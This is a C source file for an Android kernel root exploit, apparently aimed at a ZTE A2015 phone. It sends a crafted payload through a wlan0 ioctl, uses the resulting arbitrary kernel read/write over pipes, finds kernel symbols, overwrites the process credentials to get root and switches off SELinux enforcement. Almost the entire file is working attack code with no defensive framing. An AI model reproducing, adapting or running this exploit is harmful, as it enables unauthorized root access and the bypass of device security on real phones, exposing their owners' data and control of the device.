#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <asm/ioctls.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <linux/kernel.h>
#include <net/if.h>
#include <fcntl.h>
#include "becomeroot.h"
#include "ksyms_search.h"
#include "sha256.h"

#define IOCTL_COMMAND	0x8bf7


struct phone_fit_data{
	char md5[32]	;	//0c540ac35bc597fa3611ef9d82ea6591912fab4e14caf70302ef37a2111810fb
	unsigned long int addr_value0	;	//0xffffffc0003508a4		0x20
	unsigned long int addr_value1	;	//0xffffffc0003e718c		0x28
	unsigned long int addr_value2	;	//0xffffffc000a7649c		0x30
	unsigned long int addr_value3	;	//0xffffffc000645a00		0x38
	unsigned long int addr_value4	;	//0xffffffc00057c590		0x40
	unsigned long int addr_value5	;	//0xffffffc000bbf20c		0x48
	unsigned long int addr_value6	;	//0x10100101c0ffffff		0x50
};

struct phone_fit_data fit_data = {0};
char filename[2048] = {0};

void print_chars(char* chs, int size){
	int i;
	char* split;
	char format[20];
	printf("%p : ", chs);
	for(i=0; i<size; i++){
		if( 0 == (i+1) % 4 ){
			split = "\t";
		}else{
			split = " ";
		}
		if( *(chs+i) < 16 ){
			sprintf(format, "0%%x%s", split);
		}else{
			sprintf(format, "%%x%s", split); 
		}
		printf(format, *(chs+i));
		
	}
	printf("\n");
}

int write_kernel(void* kernel_addr, void* process_addr, int size){
	int filedes[0];
	int size_res;
	
	pipe(filedes);
	
	write(filedes[1], process_addr, size);
	if( size != ( size_res = read(filedes[0], kernel_addr, size) ) ){
		//puts("[--] failed to write kernel");
	}
	
	close(filedes[0]);
	close(filedes[1]);
	return size_res;
}

int kernel_read(void* kernel_addr, void* process_addr, int size){
	int filedes[0];
	int size_res;
	
	pipe(filedes);
	
	if( size != ( size_res = write(filedes[1], kernel_addr, size) ) ){
		//puts("[--] failed to read kernel"); 
	}else{
		read(filedes[0], process_addr, size);
	}
	
	close(filedes[0]);
	close(filedes[1]);
	return size_res;
}

void get_phone_prop(const char* prop_name, char res[]){
	FILE* fp;
	char line[1024];
	char* ptr = NULL;
	char* end = NULL;
	
	fp = fopen("/system/build.prop", "r");
	if(NULL == fp){
		return;
	}
	
	while( fgets(line, sizeof(line)-1, fp) ){
		if( NULL != (ptr = strstr(line, prop_name)) && NULL != strstr(line, "=") ){
			ptr += strlen(prop_name); 
			
			while( ' ' == *ptr || '\t' == *ptr ||  '=' == *ptr ){
				ptr++;
			}
			
			end = ptr + strlen(ptr)-1;
			if(end > line+ strlen(line)-1 ){
				continue;
			}
			while( '\r' == *end || '\n' == *end ){
				*end=0;
				end--;
			}
			
			strcpy(res, ptr);
			break;
		}
	}
	
	fclose(fp);
}

void get_phone_linux_version(char res[]){
	FILE* fp;
	char line[1024];
	char* end = NULL;
	
	fp = fopen("/proc/version", "r");
	if(NULL == fp){
		return;
	}
	
	memset(line, 0, sizeof(line));
	fgets(line, sizeof(line)-1, fp);
	
	if(0 != strlen(line)){
		end = line + strlen(line)-1;
		while( '\r' == *end || '\n' == *end ){
			*end=0;
			end--;
		}
		strcpy(res, line);
	}
	
	
	fclose(fp);
}

void get_phone_props(char res[], int size){
	char brand[1024]={0};
	char manufacturer[1024]={0};
	char model[1024]={0};
	char linux_version[1024]={0};
	
	get_phone_prop("ro.product.brand", brand);
	get_phone_prop("ro.product.manufacturer", manufacturer);
	get_phone_prop("ro.product.model", model);
	get_phone_linux_version(linux_version);
	
	snprintf(res, size, "%s|%s|%s", brand, model, linux_version);
}

struct phone_fit_data* get_fit_data(){
	SHA256_CTX ctx;
	char phone_data[2048];
	char hash[32];
	int fd ;
	
	//[ZTE|ZTE A2015|Linux version 3.10.49-perf-ga5b53b6 (zte@scl_xa243_222) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #2 SMP PREEMPT Thu Sep 24 12:45:18 CST 2015]
	//0c540ac35bc597fa3611ef9d82ea6591912fab4e14caf70302ef37a2111810fb
	memset(phone_data, 0, sizeof(phone_data));
	//strcpy(phone_data, "ZTE|ZTE A2015|Linux version 3.10.49-perf-ga5b53b6 (zte@scl_xa243_222) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #2 SMP PREEMPT Thu Sep 24 12:45:18 CST 2015");
	
	get_phone_props(phone_data, sizeof(phone_data));
	printf("[++] <get_fit_data> phone_data=%s\n", phone_data);
	
	memset(hash, 0, sizeof(hash));
	
	sha256_init(&ctx);
	sha256_update(&ctx, phone_data, strlen(phone_data));
	sha256_final(&ctx, hash);
	print_hash(hash);
	
	
	memset(&fit_data, 0, sizeof(fit_data));
	fd = open(filename, O_RDONLY);
	if( fd > 0 ){
		while( 0x58 == read(fd, &fit_data, sizeof(fit_data)) ){
			if( 0 == memcmp(hash, &fit_data, sizeof(hash)) ){
				close(fd);
				return &fit_data;
			}
		}
		
		close(fd);
	}
	
	return NULL;
}

int prepare(){
	int ret;
	int fd ;
	char core_data[0x1000];//sp+0x2470~sp+0x3470
	char data3[0x200] = {0};//sp+0x2270~sp+0x2470
	char sp[0x2000];
	struct phone_fit_data* fit_data;
	struct ifreq ifr; //sp+0x3470
	char* ptr0;
	unsigned int n0;
	unsigned int n1;
	char* target_ptr;
	unsigned long int target_addr;
	
	//cfg init 
	memset(core_data, 0, 8);
	memset(core_data+8, 'A', sizeof(core_data)-8);
	
	ptr0 = core_data + 0xB;
	n0 = 0;
	n1 = 0x13370000;
	do{//loc_401BFC
		*( unsigned int *)( ptr0 + n0 ) = n1 + n0;
		n0 = n0 + 4;
	}while( n0 < 0xFF8 );
	
	*core_data = 0x1;
	*(core_data+1) = 0x0;
	*(core_data+2) = 0x4;
	
	ptr0 = core_data+6;
	n0 = 0;
	do{//loc_401C60
		*ptr0 = 0;
		ptr0 = ptr0 + 0x14; 
		n0 = n0 + 1;
	}while( n0 < *(core_data+2) - 1);
	*ptr0 = 0xD4;
	
	//ifr init
	memset(&ifr, 0, sizeof(ifr));
	
	strcpy(ifr.ifr_ifrn.ifrn_name, "wlan0");
	ifr.ifr_ifru.ifru_data = core_data;
	*(unsigned int*)( (char*)&ifr.ifr_ifru.ifru_data + sizeof(void*) ) = 0x1000;
	
	
	//
	memset(sp, 0, sizeof(sp));
	fit_data = get_fit_data();
	if(NULL == fit_data){
		return -1;
	}
	
	*(void**)(sp+0x88) = (void*)fit_data->addr_value1;
	*(void**)(sp+0x80) = (void*)fit_data->addr_value4;
	
	memset(data3, 0, 0x200);//0x2270~0x2470
	
	*(void**)(core_data+0xff) = data3;
	*(void**)(sp + 0x70) = sp+0x340;
	*(void**)(sp + 0x78) = core_data+0x117;
	*(void**)(data3+0x38)/*sp + 0x22A8*/ = sp + 0x240;
	*(void**)(core_data+0x117) = sp+0x340;
	*(void**)(core_data+0x107) = (void*)fit_data->addr_value0;
	*(void**)(core_data+0x10f) = (void*)fit_data->addr_value1;
	*(void**)(sp + 0x350) = sp+0xa40;
	*(void**)(sp + 0xA68) = sp+0x1240;
	*(void**)(sp + 0x12B0) = (void*)fit_data->addr_value2;
	*(void**)(sp + 0x12B8) = (void*)fit_data->addr_value2;
	if( 2 == fit_data->addr_value6){
		*(void**)(sp + 0xA50) = (void*)fit_data->addr_value3;
		*(void**)(sp + 0x68) = (void*)fit_data->addr_value3;
		target_ptr = sp + 0x240;
	}else{
		*(void**)(sp + 0xA40) = (void*)fit_data->addr_value3;
		*(void**)(sp + 0x68) = (void*)fit_data->addr_value3;
		target_ptr = *(char**)(core_data+0xff)+0x80;
	}
	*(void**)(sp + 0xD30) = (void*)fit_data->addr_value5;
	*(void**)(sp + 0xD38) = (void*)fit_data->addr_value5;
	*(void**)(sp + 0xDC0) = (void*)fit_data->addr_value5;
	
	//exploy
	fd = socket(2, 1, 0);
	
	if( -1 == ( ret = ioctl(fd, IOCTL_COMMAND, &ifr, 0x30) ) ){
		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
	}
	printf("[++] ioctl wlan0 ret=%d\n", ret);
	
	
	////0xffffffc0038c8000
	perror("rop 1");
	target_addr = (*(unsigned long int *)(target_ptr + 0x10) & 0xFFFFC000 ) ;
	printf("target_addr=%lx\n", target_addr | 0xFFFFFFC000000000UL);
	
	//
	*(void**)(core_data+0xff) = data3;
	**(void***)(sp + 0x78) = sp+0x240;
	*(void**)(core_data+0x10f) = *(void**)(sp + 0x88);
	*(void**)(sp+0x250) = *(void**)(sp + 0x70);
	*(void**)(sp+0x368) = sp+0xa40;
	*(void**)(sp+0xAB0) = *(void**)(sp + 0x80);
	*(void**)(sp+0xAB8) = *(void**)(sp + 0x80);
	*(void**)(sp+0x348) = *(void**)(sp + 0x68);
	*(void**)(sp+0x370) = (void*)0xFFFFFFFFFFFFFFFFUL;
	*(void**)(sp+0x630) = (void*)fit_data->addr_value5;
	*(void**)(sp+0x638) = (void*)fit_data->addr_value5;
	*(void**)(data3+0x38)/*sp + 0x22A8*/ = (void*)( ( target_addr | 0xFFFFFFC000000008UL ) - 0x10);
	*(void**)(sp+0x6C0) = (void*)fit_data->addr_value5;
	
	if( -1 == ( ret = ioctl(fd, IOCTL_COMMAND, &ifr, 0x889) ) ){
		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
	}
	printf("[++] ioctl wlan0 ret=%d\n", ret);
	
	perror("rop 2");
	
	//验证
	/*
	printf("+++++++++++++++++++++++\n");
	print_chars( (char*)&ifr, 16 );
	print_chars( (char*)&ifr.ifr_ifru.ifru_data, sizeof(ifr)-16);
	
	print_chars( (char*)core_data, 3);
	for( n0=0; n0 < 0x1000; n0 +=20 ){
		print_chars( (char*)core_data+n0+3, 20);
	}
	*/
	return 0;
}

int read_from_kernel_wrap(void* kernel_addr, void* local_addr, int size){
	int count = size/0x4000;
	int rest = size%0x4000;
	int i;
	
	for(i=0;i<count;i++){
		if( 0x4000 != kernel_read( (void*)((unsigned long)kernel_addr + i*0x4000), (void*)((unsigned long)local_addr + i*0x4000), 0x4000) ){
			//printf("[-] <read_from_kernel_wrap> failed to read\n");
			return 0;
		}
	}
	if( rest != kernel_read( (void*)((unsigned long)kernel_addr + count*0x4000), (void*)((unsigned long)local_addr + count*0x4000), rest) ){
		//printf("[-] <read_from_kernel_wrap> failed to read\n");
		return 0;
	}
	return size;
}

int write_to_kernel_wrap(void* kernel_addr, void* local_addr, int size){
	int count = size/0x4000;
	int rest = size%0x4000;
	int i;
	
	for(i=0;i<count;i++){
		if( 0x4000 != write_kernel( (void*)((unsigned long)kernel_addr + i*0x4000), (void*)((unsigned long)local_addr + i*0x4000), 0x4000) ){
			//printf("[-] <read_from_kernel_wrap> failed to read\n");
			return 0;
		}
	}
	if( rest != write_kernel( (void*)((unsigned long)kernel_addr + count*0x4000), (void*)((unsigned long)local_addr + count*0x4000), rest) ){
		//printf("[-] <read_from_kernel_wrap> failed to read\n");
		return 0;
	}
	return size;
}

int root(){
	struct ks_result* res = NULL; 
	struct process_identify pi;
	void* cred; 
	int offset=-1;
	
	if( 0 != prepare() ){
		printf("[-] <root> failed to prepare\n");
		return -1;
	}
	
	//kallsyms
	res = find_ksyms(read_from_kernel_wrap);
	if(NULL == res){
		printf("[-] <root> failed to find_ksyms\n");
		return -1;
	}
	print_kr_result(res);
	
	//cred
	memset(&pi, 0, sizeof(struct process_identify));
	if( 0 != root_set_identify(&pi) ){
		printf("[-] <root> failed to root_set_identify\n");
		return -1;
	}
	root_print_identify(&pi);
	
	if( -1 == prctl(PR_SET_NAME, TASK_COMM_NAME_SELF) ){
		printf("[-] <root> failed to prctl\n");
		return -1;
	}
	
	cred = root_get_cred(read_from_kernel_wrap, &pi, &offset);
	printf("[+] <root> cred=%p, offset=%d\n", cred, offset);
	
	if(NULL == cred || -1 == offset){
		printf("[-] <root> failed to root_get_cred\n");
		return -1;
	}
	
	//write
	if( 0 != root_write_to_kernel(cred, offset, (void*)res->selinux_enforcing_addr, write_to_kernel_wrap) ){
		printf("[-] <root> failed to root_write_to_kernel\n");
		return -1;
	}
	
	//验证
	printf("[+] <root> uid=%d\n", getuid());
	printf("[+] <root> selinux=%d\n", root_get_selinux_status());
	
	printf("[+] <root> over haha\n");
	return 0;
}

int main(int argc, char* argv[]){
	if( argc < 2){
		printf("Usage : %s <config file path>\n", argv[0]);
		return;
	}
	strncpy(filename, argv[1], sizeof(filename));
	root();
	if( -1 == prctl(PR_SET_NAME, "common") ){
		printf("[-] <root> failed to prctl\n");
		return;
	}
	return 0;
}